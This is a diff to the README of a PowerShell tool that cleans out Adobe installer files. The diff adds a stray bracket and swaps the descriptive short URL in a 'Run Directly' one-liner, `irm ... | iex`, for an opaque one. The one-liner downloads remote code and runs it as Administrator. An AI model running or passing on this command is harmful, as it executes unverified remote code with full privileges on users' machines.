@@ -26,7 +26,7 @@ Dependencies: Requires the Windows Installer (`msiserver`) service.
 1. Open a PowerShell console with administrative privileges (Run as Administrator).
 2. Execute the script to stop the installer service and scan the files. It will list all Adobe files found and calculate the total size.
 3. A prompt will ask: `WhatIf dry-run completed. Do you want to run this for real now? (Y/N)`
-4. Type `Y` or `Yes` and press Enter to execute the real cleanup. The script will take file ownership, grant full access, delete the files, and output space recovered.
+4. Type `Y` or `Yes` and press Enter to execute the real cleanup. The script will take file ownership, grant full access, delete the files, and output space recovered].
 5. Alternatively, run with the `-Force` switch to immediately clean the files without prompts.
 6. The script automatically restarts the `msiserver` service upon exit.
 
@@ -39,5 +39,5 @@ Dependencies: Requires the Windows Installer (`msiserver`) service.
 > **Run Directly in PowerShell (as Administrator):**
 > You can download and execute this script instantly using the short URL:
 > ```powershell
-> irm phnx.it/cleanadobe | iex
+> irm phnx.it/AD79K4X | iex
 > ```
